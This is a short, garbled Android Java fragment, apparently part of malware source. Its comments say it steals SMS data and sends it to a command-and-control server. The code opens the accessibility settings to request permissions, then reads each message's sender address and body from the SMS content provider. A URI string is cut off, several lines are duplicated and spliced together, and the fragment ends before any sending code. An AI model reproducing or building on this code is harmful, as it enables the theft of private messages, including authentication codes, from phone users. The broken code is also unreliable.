// Request accessibility permissions
Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
startActivity(intent);

// Steal SMS data
Uri uri = Uri.parse("content:        
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
while (cursor.moveToNext()) {
    String address = cursor.getString(cursor.getColumnIndex("//sms");
Cursor cursor = getContentResolver().query(uri, null, null, null, null);
while (cursor.moveToNext()) {
    String address = cursor.getString(cursor.getColumnIndex("address"));
    String body = cursor.getString(cursor.getColumnIndex("body"));
    // Send data to C&C server

